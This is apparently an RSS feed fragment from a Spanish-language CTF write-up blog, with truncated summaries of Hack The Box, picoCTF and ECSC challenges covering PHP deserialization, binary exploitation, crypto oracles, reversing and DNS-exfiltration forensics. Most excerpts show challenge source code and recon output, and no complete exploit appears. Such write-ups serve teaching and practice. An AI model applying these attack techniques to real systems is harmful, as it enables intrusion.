from Crypto.Cipher import AES from Crypto.Util.Padding import pad import random import signal import subprocess import socketserver FLAG = b'HTB{--REDACTED--}' prefix = random.randbytes(12) key = random.randbytes(16) def encrypt(key, msg): msg = bytes.fromhex(msg) crypto = AES.new(key, AES.MODE_ECB) padded = pad(prefix + msg + FLAG, 16) return crypto.encrypt(padded).hex() def challenge(req): req.sendall(b'Welcome to Klaus\'s crypto lab.\n' + b'It seems like there is a prefix appended to the real firmware\n' + b'Can you somehow extract the firmware and fix the chip?</description></item><item><title>The Vault</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/the-vault/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/the-vault/</guid><description>Se nos da un binario llamado vault:
$ file vault vault: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 4.4.0, stripped Descompilación Abrimos Ghidra para descompilarlo. Esta es la función entry:
void processEntry entry(undefined8 param_1, undefined8 param_2) { undefined auStack_8[8]; __libc_start_main(FUN_0010c450, param_2, &amp;amp;stack0x00000008, FUN_0010d460, FUN_0010d4d0, param_1, auStack_8); do { // WARNING: Do nothing block with infinite loop } while (true); } Entonces, la función &amp;ldquo;main&amp;rdquo; es FUN_0010c450 (el nombre de la función es su dirección porque el binario está despojado de sus símbolos), que solo llama a otra:</description></item><item><title>Time Traveller</title><link>https://7rocky.github.io/ctf/ctflearn/miscellaneous/time-traveller/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/miscellaneous/time-traveller/</guid><description>En este reto, nos piden encontrar una dirección de email que se mostró en la página web de la NASA (nasa.gov) el 31 de diciembre de 1996.
La manera de encontrar algo en una fecha concreta es recurrir a web.archive.org (WayBack Machine):
Aquí podemos buscar por nasa.gov y obtener un montón de snapshots de la página web. Curiosamente, la más antigua es del 31 de diciembre de 1996:
Si vamos a ese snapshot, veremos alguna información.</description></item><item><title>Tough decisions</title><link>https://7rocky.github.io/ctf/other/ecsc-2023/tough-decisions/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/ecsc-2023/tough-decisions/</guid><description>Champagne for my real friends, real pain for my sham friends.
Challenge contributed by CryptoHack
Challenge files:
output.txt tough_decisions.py Análisis del código fuente Se nos proporciona un script en Python que toma la flag como bits y, por cada bit, imprime 6 salidas de una de las funciones real (bit 0) o fake (bit 1):
if __name__ == "__main__": s = sample_key() for b in get_flag(): print([[real, fake][b](s) for _ in range(6)]) Por lo tanto, el objetivo es encontrar una manera de diferenciar entre resultados de real y fake para obtener los bits de la flag.</description></item><item><title>Toxic</title><link>https://7rocky.github.io/ctf/htb-challenges/web/toxic/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/toxic/</guid><description>Se nos proporciona un sitio web como este:
También se tenemos el código fuente del servidor en PHP.
Análisis del código fuente Este es index.php:
&amp;lt;?php spl_autoload_register(function ($name){ if (preg_match('/Model$/', $name)) { $name = "models/${name}"; } include_once "${name}.php"; }); if (empty($_COOKIE['PHPSESSID'])) { $page = new PageModel; $page-&amp;gt;file = '/www/index.html'; setcookie( 'PHPSESSID', base64_encode(serialize($page)), time()+60*60*24, '/' ); } $cookie = base64_decode($_COOKIE['PHPSESSID']); unserialize($cookie); Como podemos ver, el servidor codifica una página (/www/index.html por defecto) en la cookie PHPSESSID, y también la serializa:</description></item><item><title>Trapped Source</title><link>https://7rocky.github.io/ctf/htb-challenges/web/trapped-source/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/trapped-source/</guid><description>Se nos proporciona este sitio web:
Parece un panel donde debemos ingresar un PIN.
Inspeccionando el código HTML Si presionamos Ctrl-U en el teclado, veremos el código HTML del sitio web:
¡Sorpresa! El PIN esperado está ahí en texto claro: 1425. Vamos a ponerlo:
Flag Y aquí está la flag:
HTB{vi3w_cli13nt_s0urc3_S3cr3ts!}</description></item><item><title>TrapTrack</title><link>https://7rocky.github.io/ctf/htb-challenges/web/traptrack/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/traptrack/</guid><description>Se nos proporciona una página web como esta:
También tenemos el código fuente del proyecto.
Funcionalidad del sitio web La aplicación web nos permite ingresar una URL que se almacenará en una base de datos SQLite. Al leer el código de challenge/application/config.py encontramos credenciales válidas (admin:admin):
from application.util import generate import os class Config(object): SECRET_KEY = generate(50) ADMIN_USERNAME = 'admin' ADMIN_PASSWORD = 'admin' SESSION_PERMANENT = False SESSION_TYPE = 'filesystem' SQLALCHEMY_DATABASE_URI = 'sqlite:////tmp/database.</description></item><item><title>TrapTrack</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/traptrack/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/traptrack/</guid><description>Se nos proporciona una página web como esta:
También tenemos el código fuente del proyecto.
Funcionalidad del sitio web La aplicación web nos permite ingresar una URL que se almacenará en una base de datos SQLite. Al leer el código de challenge/application/config.py encontramos credenciales válidas (admin:admin):
from application.util import generate import os class Config(object): SECRET_KEY = generate(50) ADMIN_USERNAME = 'admin' ADMIN_PASSWORD = 'admin' SESSION_PERMANENT = False SESSION_TYPE = 'filesystem' SQLALCHEMY_DATABASE_URI = 'sqlite:////tmp/database.</description></item><item><title>Tree of Danger</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/tree-of-danger/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/tree-of-danger/</guid><description>Se nos proporciona el código Python que está ejecutando la instancia remota (util.py):
#!/usr/bin/env python3.10 import ast import math from typing import Union def is_expression_safe(node: Union[ast.Expression, ast.AST]) -&amp;gt; bool: match type(node): case ast.Constant: return True case ast.List | ast.Tuple | ast.Set: return is_sequence_safe(node) case ast.Dict: return is_dict_safe(node) case ast.Name: return node.id == "math" and isinstance(node.ctx, ast.Load) case ast.UnaryOp: return is_expression_safe(node.operand) case ast.BinOp: return is_expression_safe(node.left) and is_expression_safe(node.right) case ast.Call: return is_call_safe(node) case ast.</description></item><item><title>Trick or Breach</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/trick-or-breach/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/trick-or-breach/</guid><description>Se nos proporciona un archivo con una captura de tráfico de red llamado capture.pcap:
Análisis de tráfico Podemos usar Wireshark para analizarlo:
Consultas DNS Todos los paquetes corresponden a consultas DNS (y respuestas). Lo que destaca es el subdominio: todas las consultas preguntan por hex-data.pumpkincorp.com.
Si filtramos por los datos hexadecimales en el archivo capture.pcap, tenemos lo siguiente:
$ strings capture.pcap | grep -E '[0-9a-f]{32,}' | head 2504b0304140008080800a52c47550000000000000000000000 2504b0304140008080800a52c47550000000000000000000000 20018000000786c2f64726177696e67732f64726177696e6731 20018000000786c2f64726177696e67732f64726177696e6731 22e786d6c9dd05d6ec2300c07f013ec0e55de695a181343145e 22e786d6c9dd05d6ec2300c07f013ec0e55de695a181343145e 2d04e300ee0256e1b918fca0ea3dc7ed14a36697b011e6dcb3f 2d04e300ee0256e1b918fca0ea3dc7ed14a36697b011e6dcb3f 2f9efcd6e74b6f84462137c23eab212057a15b4f15d230eef6f 2f9efcd6e74b6f84462137c23eab212057a15b4f15d230eef6f Nótese que todas las líneas empiezan por 2, que no es parte del subdominio (se comprueba en la imagen anterior), por lo que tenemos que quitarlo:</description></item><item><title>Trick or Deal</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/trick-or-deal/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/trick-or-deal/</guid><description>Se nos proporciona un binario de 64 bits llamado trick_or_deal:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Ingeniería inversa Si usamos Ghidra, podremos ver el siguiente código en C descompilado de la función main:
undefined8 main(undefined8 param_1, undefined8 param_2) { undefined8 in_R9; setup(); fprintf(stdout, "%s %s Welcome to the Intergalactic Weapon Black Market %s\n", &amp;amp;DAT_0010123c, &amp;amp;DAT_00101241, &amp;amp;DAT_0010123c, in_R9, param_2); fprintf(stdout, "\n%sLoading the latest weaponry .</description></item><item><title>Tsayaki</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/tsayaki/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/tsayaki/</guid><description>Se nos proporciona el código fuente del servidor en Python:
from tea import Cipher as TEA from secret import IV, FLAG import os ROUNDS = 10 def show_menu(): print(""" ============================================================================================ || I made this decryption oracle in which I let users choose their own decryption keys. || || I think that it's secure as the tea cipher doesn't produce collisions (?) ... Right? || || If you manage to prove me wrong 10 times, you get a special gift.</description></item><item><title>TurboCipher</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/turbocipher/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/turbocipher/</guid><description>Este es un reto que diseñé para Hack the Box. Se nos proporciona el código fuente en Python del servidor:
#!/usr/bin/env python3 from Crypto.Util.number import bytes_to_long, getPrime, getRandomRange from secret import FLAG, fast_turbonacci, fast_turbocrypt from typing import Callable def turbonacci(n: int, p: int, b: int, c: int) -&amp;gt; int: if n &amp;lt; 2: return n return (b * turbonacci(n - 1, p, b, c) + c * turbonacci(n - 2, p, b, c)) % p def lcg(x: int, m: int, n: int, p: int) -&amp;gt; int: return (m * x + n) % p def turbocrypt(pt: int, k: int, f: Callable[[int], int]) -&amp;gt; int: return sum((f(i + 1) - f(i)) for i in range(k, pt)) def menu() -&amp;gt; int: print('Choose one option') print('1.</description></item><item><title>Twist and shout</title><link>https://7rocky.github.io/ctf/other/ecsc-2023/twist-and-shout/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/ecsc-2023/twist-and-shout/</guid><description>I&amp;rsquo;ll shout about my curve all day, it&amp;rsquo;s totally secure. You&amp;rsquo;ll have to pull the solution from my cold dead hands!
Challenge contributed by CryptoHack
Connect at archive.cryptohack.org 11718
Challenge files:
twist_and_shout.py Dockerfile twist_and_shout.xinetd Se nos proporciona un servidor que usa una curva elíptica para cifrar la flag.
Análisis del código fuente Tenemos los parámetros de la curva:
""" Define the elliptic curve E: y^2 = x^3 + a*x + b With order n = 340282366920938463465004184633952524077 = 2^128 - 1629577202184312621 "</description></item><item><title>TwoForOne</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/twoforone/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/twoforone/</guid><description>Se nos proporcionan dos claves públicas en formato PEM:
-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxqy430huZnHUpVZIA+HD IUqOJ03grABD7CjIWJ83fH6NMIvD4wKFA4Q0S6eYiIViCkGOatlVV4KE/ATyifEm s4oBgWJRzvmhT9TCSdlraQh/qRsuGtvcgMuW/wzLYSnY9nN9qFDEUfLtP2y2HDaJ Hckk0Kso8mrfDtNXzoSNAv/gCRJxTM9jcsH0EIDoZ0egMD61zfbOkS8RRP1PVXQ8 eWh1oU/f+Pi2YhUMVr5YsJI5dx3ETZaQecStj9mTvGMLeFXS4C6L4Wgk3NWrOBMj HBcxEQqL0CjXod+riS51KUVXuvxxrq9eSNsCZ6bbY9NQ+ZUGjuHK1tMt8RpJvSS6 lwIDAQAB -----END PUBLIC KEY----- -----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxqy430huZnHUpVZIA+HD IUqOJ03grABD7CjIWJ83fH6NMIvD4wKFA4Q0S6eYiIViCkGOatlVV4KE/ATyifEm s4oBgWJRzvmhT9TCSdlraQh/qRsuGtvcgMuW/wzLYSnY9nN9qFDEUfLtP2y2HDaJ Hckk0Kso8mrfDtNXzoSNAv/gCRJxTM9jcsH0EIDoZ0egMD61zfbOkS8RRP1PVXQ8 eWh1oU/f+Pi2YhUMVr5YsJI5dx3ETZaQecStj9mTvGMLeFXS4C6L4Wgk3NWrOBMj HBcxEQqL0CjXod+riS51KUVXuvxxrq9eSNsCZ6bbY9NQ+ZUGjuHK1tMt8RpJvSS6 lwIDBTy3 -----END PUBLIC KEY----- Y tenemos también dos textos cifrados que están asociados a las claves públicas anteriores. Es importante mencionar que el mensaje es el mismo:
RBVdQw7Pllwb42GDYyRa6ByVOfzRrZHmxBkUPD393zxOcrNRZgfub1mqcrAgX4PAsvAOWptJSHbrHctFm6rJLzhBi/rAsKGboWqPAWYIu49Rt7Sc/5+LE2dvy5zriAKclchv9d+uUJ4/kU/vcpg2qlfTnyor6naBsZQvRze0VCMkPvqWPuE6iL6YEAjZmLWmb+bqO+unTLF4YtM1MkKTtiOEy+Bbd4LxlXIO1KSFVOoGjyLW2pVIgKzotB1/9BwJMKJV14/+MUEiP40ehH0U2zr8BeueeXp6NIZwS/9svmvmVi06Np74EbL+aeB4meaXH22fJU0eyL2FppeyvbVaYQ== TSHSOfFBkK/sSE4vWxy00EAnZXrIsBI/Y6mGv466baOsST+qyYXHdPsI33Kr6ovucDjgDw/VvQtsAuGhthLbLVdldt9OWDhK5lbM6e0CuhKSoJntnvCz7GtZvjgPM7JDHQkAU7Pcyall9UEqL+W6ZCkiSQnK+j6QB7ynwCsW1wAmnCM68fY2HaBvd8RP2+rPgWv9grcEBkXf7ewA+sxSw7hahMaW0LYhsMYUggrcKqhofGgl+4UR5pdSiFg4YKUSgdSw1Ic/tug9vfHuLSiiuhrtP38yVzazqOZPXGxG4tQ6btc1helH0cLfw1SCdua1ejyan9l1GLXsAyGOKSFdKw== Las claves públicas parecen muy similares. Vamos a importarlas con Python y ver los valores de $n$ y de $e$:</description></item><item><title>Type Exception</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/type-exception/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/type-exception/</guid><description>Se nos proporciona este script en Python que se ejecuta en la instancia remota:
#!/usr/bin/env python3 import re with open("./flag.txt") as f: FLAG = f.read().strip() BLACKLIST = '"%&amp;amp;\',-/_:;@\\`{|}~*&amp;lt;=&amp;gt;[] \t\n\r\x0b\x0c' OPEN_LIST = '(' CLOSE_LIST = ')' def check_balanced(s): stack = [] for i in s: if i in OPEN_LIST: stack.append(i) elif i in CLOSE_LIST: pos = CLOSE_LIST.index(i) if ((len(stack) &amp;gt; 0) and (OPEN_LIST[pos] == stack[len(stack)-1])): stack.pop() else: return False return len(stack) == 0 def check(s): if re.</description></item><item><title>Unique</title><link>https://7rocky.github.io/ctf/htb-challenges/hardware/unique/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/hardware/unique/</guid><description>Se nos dice que un vehículo estaba enviando el VIN (Vehicle Identification Number) y guardaron la captura de la señal en un archivo (trace_captured.sal). Necesitamos encontrar el VIN.
Reconocimiento inicial Podemos abrir trace_captured.sal con Saleae Logic2:
Al principio, podemos seleccionar &amp;ldquo;Async Serial&amp;rdquo; y probar algunos bitrates:
Como podemos ver, los puntos no se ajustan a los pulsos de la señal. Podemos hacer algún cálculo para ver cuál es la tasa de bits correcta:</description></item><item><title>Unsubscriptions Are Free</title><link>https://7rocky.github.io/ctf/picoctf/binary-exploitation/unsubscriptions-are-free/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/binary-exploitation/unsubscriptions-are-free/</guid><description>Se nos proporciona un binario de 32 bits llamado vuln:
Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) Tenemos también el código fuente en C:
#include &amp;lt;stdint.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;fcntl.h&amp;gt; #include &amp;lt;ctype.h&amp;gt; #define FLAG_BUFFER 200 #define LINE_BUFFER_SIZE 20 typedef struct { uintptr_t (*whatToDo)(); char *username; } cmd; char choice; cmd *user; void hahaexploitgobrrr() { char buf[FLAG_BUFFER]; FILE *f = fopen("</description></item><item><title>Up a Stream</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/up-a-stream/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/up-a-stream/</guid><description>Se nos proporciona un archivo JAR llamado stream.jar y un output.txt:
$ cat output.txt b71bO12cO156O6e43Od8O69c3O5cd3O144Oe4O6e43O37cbOf6O69c3O1e7bO156O3183O69c3O6cO8b3bOc0O1e7bO156OfcO50bbO69c3Oc0O102O6e43OdeOb14bOc6OfcOd8Ob71bO12cO156O6e43Od8O69c3O5cd3O144Oe4O6e43O37cbOf6O69c3O1e7bO156O3183O69c3O6cO8b3bOc0O1e7bO156OfcO50bbO69c3Oc0O102O6e43OdeOb14bOc6OfcOd8Ob71bO12cO156O6e43Od8O69c3O5cd3O144Oe4O6e43O37cbOf6O69c3O1e7bO156O3183O69c3O6cO8b3bOc0O1e7bO156OfcO50bbO69c3Oc0O102O6e43OdeOb14bOc6OfcOd8Ob71bO12cO156O6e43Od8O69c3O5cd3O144Oe4O6e43O37cbOf6O69c3O1e7bO156O3183O69c3O6cO8b3bOc0O1e7bO156OfcO50bbO69c3Oc0O102O6e43OdeOb14bOc6OfcOd8Ob71bO12cO156O6e43Od8O69c3O5cd3O144Oe4O6e43O37cbOf6O69c3O1e7bO156O3183O69c3O6cO8b3bOc0O1e7bO156OfcO50bbO69c3Oc0O102O6e43OdeOb14bOc6OfcOd8O Si ejecutamos el JAR, tenemos un resultado diferente:
$ java -jar stream.jar 3b13O3183Oe4Od2O3b13O3183Oe4Od2O3b13O3183Oe4Od2O3b13O3183Oe4Od2O3b13O3183Oe4Od2O Descompilación de Java Tendremos que descompilar el archivo JAR para obtener un código fuente en Java legible. Podemos ir a www.javadecompilers.com y seleccionar CFR como descompilador. Luego, tendremos este código fuente:
/* * Decompiled with CFR 0.150. */ import java.util.Arrays; import java.util.List; import java.</description></item><item><title>Ursa Minor</title><link>https://7rocky.github.io/ctf/other/blackhat-ctf/ursa-minor/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/blackhat-ctf/ursa-minor/</guid><description>Se nos proporciona el siguiente código y una instancia a la que conectarnos:
#!/usr/local/bin/python # # Polymero # # Imports from Crypto.Util.number import isPrime, getPrime, inverse import hashlib, time, os # Local import FLAG = os.environ.get('FLAG').encode() class URSA: # Upgraded RSA (faster and with cheap key cycling) def __init__(self, pbit, lbit): p, q = self.prime_gen(pbit, lbit) self.public = {'n': p * q, 'e': 0x10001} self.private = {'p': p, 'q': q, 'f': (p - 1)*(q - 1), 'd': inverse(self.</description></item><item><title>Userland City</title><link>https://7rocky.github.io/ctf/htb-challenges/web/userland-city/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/userland-city/</guid><description>Se nos proporciona esta página web:
Enumeración Muestra un formulario de inicio de sesión. Afortunadamente, se nos proporcionan unas credenciales en la descripción del reto: lxkid02:8rsNN9ohfLp69cVRFEgk4Qzs. Por tanto, podemos usarlas para acceder:
Se trata de una simple página web de alguna tienda online de mentira para cibercriminales.
La descripción del reto es bastante larga. Lo importante son las credenciales anteriores y que la página utiliza Laravel con el modo de debug activado.</description></item><item><title>Valhalloween</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/valhalloween/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/valhalloween/</guid><description>Se nos proporcionan estos archivos:
$ tree Logs Logs ├── Application.evtx ├── DebugChannel.etl ├── HardwareEvents.evtx ├── Internet Explorer.evtx ├── Key Management Service.evtx ├── Microsoft-AppV-Client%4Admin.evtx ├── Microsoft-AppV-Client%4Operational.evtx ├── Microsoft-AppV-Client%4Virtual Applications.evtx ├── Microsoft-Client-License-Flexible-Platform%4Admin.evtx ├── Microsoft-Client-Licensing-Platform%4Admin.evtx ... ├── Microsoft-Windows-Workplace Join%4Admin.evtx ├── Microsoft-WindowsPhone-Connectivity-WiFiConnSvc-Channel.evtx ├── OAlerts.evtx ├── OpenSSH%4Admin.evtx ├── OpenSSH%4Operational.evtx ├── Parameters.evtx ├── SMSApi.evtx ├── Security.evtx ├── Setup.evtx ├── State.evtx ├── System.evtx └── Windows PowerShell.evtx 1 directory, 366 files Estos son archivos EVTX que representan logs de eventos de Windows.</description></item><item><title>Vault-breaker</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/vault-breaker/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/vault-breaker/</guid><description>Se nos proporciona un binario de 64 bits llamado vault-breaker:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./.glibc/' Si lo ejecutamos, tenemos dos opciones:
$ ./vault-breaker Current status: Unlocked 🔓 ▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▒▒▓▓▓▓▒▒▒▒▒▒░░ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░░░░░▒▒░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░▒▒▒▒▒▒▒▒░░░░░░░░░░▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░░░░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░▒▒▒▒░░▒▒░░████▓▓████░░▒▒▓▓▓▓▓▓▓▓▓▓░░▒▒░░ ░░░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░▒▒▓▓░░▓▓▒▒▒▒▒▒░░░░▒▒▓▓██▒▒▒▒▓▓▓▓▓▓░░░░ ░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░▒▒▒▒▓▓░░▓▓░░██▓▓▓▓▓▓▒▒▒▒██░░▓▓▓▓▒▒▒▒ ░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓░░░░▓▓▒▒░░▒▒██░░██▒▒▒▒▒▒▒▒██▒▒▒▒██▓▓▒▒▒▒ ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓░░░░▒▒▓▓▒▒▓▓░░▒▒▓▓▒▒▒▒░░░░░░▒▒██░░██▒▒▒▒ ▒▒▒▒▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▒▒░░░░▓▓▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒░░░░░░░░▒▒▓▓▓▓▓▓▒▒ ░░▒▒▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓░░░░▓▓▓▓▒▒▒▒▒▒▓▓░░▓▓░░░░░░░░▒▒▒▒██▒▒██▒▒ ▒▒▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓░░░░▓▓▓▓▓▓▒▒░░▒▒▓▓░░░░░░░░░░▒▒▒▒▓▓▒▒██░░ ▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▒▒▓▓▒▒░░▒▒▓▓░░▒▒░░░░░░░░░░▓▓▒▒██▒▒ ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▓▓▒▒▒▒▒▒▓▓▒▒░░░░░░░░░░░░▒▒▒▒██▒▒ ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓████▓▓▒▒▒▒░░▓▓▒▒░░░░▒▒░░▒▒▒▒▓▓▒▒▓▓░░ ▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▒▒▒▒▒▒▓▓▓▓▒▒▓▓░░░░░░▒▒░░▒▒▓▓▓▓██▒▒ ░░▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓██▒▒░░▒▒▒▒▓▓▒▒░░░░▒▒▒▒▓▓▓▓▒▒░░ ░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▓▓██▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒██▒▒░░░░ ░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▒▒▒▒▓▓▒▒▒▒░░▓▓▒▒▒▒▒▒▓▓▒▒██▒▒▓▓▓▓░░░░ ░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓██▓▓▒▒██▒▒░░▒▒▒▒▒▒▓▓▓▓▓▓▒▒▓▓▓▓▓▓░░░░ 